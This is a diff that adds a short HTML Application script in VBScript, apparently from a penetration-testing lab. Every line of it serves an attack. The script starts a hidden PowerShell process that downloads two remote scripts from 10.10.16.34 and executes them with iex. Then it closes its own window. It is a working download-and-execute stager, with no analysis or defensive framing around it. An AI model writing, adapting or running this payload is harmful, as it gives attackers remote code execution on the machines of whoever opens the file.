@@ -1,0 +1,11 @@
+<script language="VBScript">
+  Function DoStuff()
+    Dim wsh
+    Set wsh = CreateObject("Wscript.Shell")
+    wsh.run "%SystemRoot%\sysnative\WindowsPowerShell\v1.0\powershell -Sta -Nop -Window Hidden -c iex(New-Object Net.WebClient).downloadString('http://10.10.16.34/avee.ps1'); iex(New-Object Net.WebClient).downloadString('http://10.10.16.34/covid.ps1')"
+    Set wsh = Nothing
+  End Function
+
+  DoStuff
+  self.close
+</script>
